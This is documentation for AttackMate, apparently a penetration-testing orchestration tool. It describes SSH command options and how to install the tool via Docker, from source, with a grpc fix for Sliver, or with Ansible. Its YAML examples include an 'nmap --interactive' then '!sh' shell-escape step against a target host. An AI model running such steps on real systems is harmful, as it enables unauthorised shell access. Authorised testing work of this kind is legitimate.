+
+      vars:
+        $SERVER_ADDRESS: 192.42.0.254
+        $SSH_SERVER: 10.10.10.19
+
+      commands:
+        # creates new ssh-connection and session
+        - type: ssh
+          cmd: "nmap --interactive\n"
+          interactive: True
+          hostname: $SSH_SERVER
+          username: aecid
+          key_filename: "/home/alice/.ssh/id_rsa"
+          creates_session: "attacker"
+
+        # break out of the nmap-interactive-mode
+        - type: ssh
+          cmd: "!sh\n"
+          interactive: True
+          session: "attacker"
+
+.. confval:: command_timeout
+
+   The interactive-mode works with timeouts while reading the output. If there is no output for some seconds,
+   the command will stop reading.
+
+   :type: int
+   :default: ``15``
+
+.. confval:: prompts
+
+   In interactive-mode the command will try reading the output for a certain amount of seconds. If the output
+   ends with any string found in ``prompts``, the command will stop immediately.
+   If ``prompts`` is an empty list, no prompt checking will be performed.
+
+   :type: list[str]
+   :default: ``["$ ", "# ", "> "]``
+
+   .. code-block:: yaml
+
+      vars:
+        $SSH_SERVER: 10.10.10.19
+
+      commands:
+        # creates new ssh-connection and session
+        - type: ssh
+          cmd: "nmap --interactive\n"
+          interactive: True
+          prompts:
+            - "$ "
+            - "# "
+            - "> "
+            - "% "
+          hostname: $SSH_SERVER
+          username: aecid
+          key_filename: "/home/alice/.ssh/id_rsa"
+          creates_session: "attacker"
+
+
+   .. code-block:: yaml
+
+      vars:
+        $SSH_SERVER: 10.10.10.19
+
+      commands:
+        # prompts is an empty list
+        - type: ssh
+          cmd: "id\n"
+          interactive: True
+          prompts: []
+          hostname: $SSH_SERVER
+          username: aecid
+          password: password
+          creates_session: "attacker"
+
+
+.. confval:: bin
+
+   Enable binary mode. In this mode only hex-characters are allowed.
+
+   :type: bool
+   :default: ``False``
+
+   .. code-block:: yaml
+
+      vars:
+        $SERVER_ADDRESS: 192.42.0.254
+        $SSH_SERVER: 10.10.10.19
+
+      commands:
+        - type: ssh
+          # hex-code for "id"
+          cmd: "6964"
+          bin: True
+          hostname: $SSH_SERVER
+          username: aecid
+          key_filename: "/home/alice/.ssh/id_rsa"
+
+----------------------------
+
+attackmate/attackmate.rst
+file content ...
+
+attackmate package
+==============
+
+Submodules
+----------
+
+attackmate.baseexecutor module
+--------------------------
+
+.. automodule:: attackmate.baseexecutor
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.metadata module
+----------------------
+
+.. automodule:: attackmate.metadata
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.msfexecutor module
+-------------------------
+
+.. automodule:: attackmate.msfexecutor
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.attackmate module
+--------------------
+
+.. automodule:: attackmate.attackmate
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.schemas module
+---------------------
+
+.. automodule:: attackmate.schemas
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.shellexecutor module
+---------------------------
+
+.. automodule:: attackmate.shellexecutor
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.sleepexecutor module
+---------------------------
+
+.. automodule:: attackmate.sleepexecutor
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+attackmate.varparse module
+----------------------
+
+.. automodule:: attackmate.varparse
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+Module contents
+---------------
+
+.. automodule:: attackmate
+   :members:
+   :undoc-members:
+   :show-inheritance:
+
+----------------------------
+
+attackmate/modules.rst
+file content ...
+
+attackmate
+======
+
+.. toctree::
+   :maxdepth: 4
+
+   attackmate
+
+----------------------------
+
+installation/docker.rst
+file content ...
+
+.. _docker:
+
+========================
+Installation with Docker
+========================
+
+AttackMate can be run inside Docker containers. In order to build
+the image, download the sources first:
+
+::
+
+  $ git clone https://github.com/ait-aecid/attackmate.git
+  $ cd attackmate
+
+
+Build the image using the following command:
+
+::
+
+  $ docker build -t attackmate -f Dockerfile .
+
+.. note::
+
+   Docker will also compile grpcio from sources in order to make
+   the sliver-api work. This might take a while.
+
+----------------------------
+
+installation/index.rst
+file content ...
+
+============
+Installation
+============
+
+AttackMate can be installed :ref:`from source <manual>` or
+by using :ref:`Docker containers <docker>`.
+
+In order to use AttackMate's capabilities to orchestrate `Metasploit <https://www.metasploit.com/>`_
+or `Sliver <https://bishopfox.com/tools/sliver>`_, it is necessary to install and configure :ref:`Metasploit <prep_msf>`
+and :ref:`Sliver <prep_sliver>`.
+
+.. toctree::
+   :maxdepth: 1
+   :hidden:
+
+   manual
+   sliverfix
+   ansible
+   docker
+
+----------------------------
+
+installation/manual.rst
+file content ...
+
+.. _manual:
+
+=========================
+Installation from sources
+=========================
+
+AttackMate is written in python language. It can execute various pentesting and hacking tools.
+Therefore, it is recommended to install AttackMate under Kali Linux. However, it should also
+work on other Linux distributions. In order to prepare your system for AttackMate install the
+following tools:
+
+::
+
+  $ sudo apt install python3 python3-pip git python3-venv libmagic1
+
+.. note::
+
+   python3-venv must only be installed if AttackMate should be installed in a virtual environment
+
+Download the sources:
+
+::
+
+  $ git clone https://github.com/ait-aecid/attackmate.git
+  $ cd attackmate
+
+Optional: Create virtual environment and activate it:
+
+::
+
+  $ python3 -mvenv venv
+  $ source venv/bin/activate
+
+Finally install attackmate and it's dependencies:
+
+::
+
+  $ pip3 install .
+
+.. warning::
+
+   Please note that you need to :ref:`sliver-fix` if you want
+   to use the sliver commands!
+
+----------------------------
+
+installation/sliverfix.rst
+file content ...
+
+.. _sliver-fix:
+
+==================
+Install sliver-fix
+==================
+
+Currently there is a `nasty bug with grpcclient and TLS1.3 <https://github.com/moloch--/sliver-py/issues/28>`_
+that breaks the communication between Sliver-API and AttackMate. In order to make
+AttackMate work with the Sliver-API it is necessary to manually compile grpc with
+the environment variable ``GRPC_PYTHON_BUILD_SYSTEM_OPENSSL=True``
+
+
+.. note::
+
+   Please note that this fix is already included in the Dockerfile.
+
+First install all required build-tools. This example will install the build-tools
+in Debian-based distributions:
+
+::
+
+  $ sudo apt-get install -y git build-essential python3-dev libssl-dev
+
+If you are inside the attackmate repository, change to another directory:
+
+::
+
+  $ cd ..
+
+Next download the grpc-sources, update the submodules and install the
+dependencies:
+
+::
+
+  (venv)$ git clone https://github.com/grpc/grpc && cd grpc
+  (venv)$ git submodule update --init
+  (venv)$ pip install -r requirements.txt
+
+Now remove the packages we want to compile by our own:
+
+::
+
+  (venv)$ pip uninstall --yes protobuf
+  (venv)$ pip uninstall --yes grpcio-tools
+
+Install the proper versions:
+
+::
+
+  (venv)$ pip install --no-input protobuf==3.20.*
+  (venv)$ pip install --no-input grpcio-tools
+
+And compile grpc:
+
+::
+
+  (venv)$ GRPC_PYTHON_BUILD_SYSTEM_OPENSSL=True pip install --use-pep517 --no-input .
+
+----------------------------
+
+installation/ansible.rst
+file content ...
+
+.. _ansible:
+
+=========================
+Installation with Ansible
+=========================
+
+It is possible to automatically install AttackMate using
+Ansible. The `ansible-role <https://github.com/ait-aecid/attackmate-ansible>`_ also deploys the sliver-fix.
+
+.. note::
+
+   Currently the ansible role only works with Debian and Ubuntu distributions.
+
+
+Installation Steps
+==================
+
+1. Install Ansible:
+
+::
+
+  $ sudo apt update
+  $ sudo apt install ansible -y
+
+2. Set Up the Playbook
+
+   Create a new directory for your AttackMate setup, navigate into it, and create your playbook file:
+
+::
+
+     $ mkdir my-attackmate
+     $ cd my-attackmate
+     $ touch install_attackmate.yml
+
+Open the `install_attackmate.yml` file and fill it with this sample playbook (it also can be found on the README-page
+of the `github-repository <https://github.com/ait-aecid/attackmate-ansible>`_), which installs AttackMate on localhost:
+
+::
+
+    - name: Install attackmate
+      become: true
+      hosts: localhost
+      roles:
+        - role: attackmate
+          vars:
+            attackmate_sliverfix: True
+            attackmate_version: development
+            attackmate_msf_server: localhost
+            attackmate_msf_passwd: hackerman
+            attackmate_playbooks:
+              - upgradeshell.j2
+              - attackchain.j2
+
+
+
+3. Create an Inventory File:
+
+   Create an inventory file to specify the hosts. For example, create a file named `hosts` with the
+   following content:
+
+::
+
+  [local]
+  localhost ansible_connection=local
+
+
+3. Clone the Ansible Role
+
+   Ansible expects all roles to be in the **roles** directory. Create this directory and clone the repository:
+
+::
+
+  $ mkdir -p roles/attackmate
+  $ git clone https://github.com/ait-testbed/attackmate-ansible roles/attackmate
+
+4. Run the playbook
+
+::
+
+  $ ansible-playbook -i hosts install_attackmate.yml
+
+.. note::
+
+  If you don't have an SSH key set up for passwordless access, you might need to use the `--ask-become-pass` flag, as
+  Ansible requires a password for `sudo` operations.
+
+To verify that the installation was successful, run:
+
+::
+
+  $ attackm8 -h
+
+This should display the usage of AttackMate.
+
+----------------------------
+
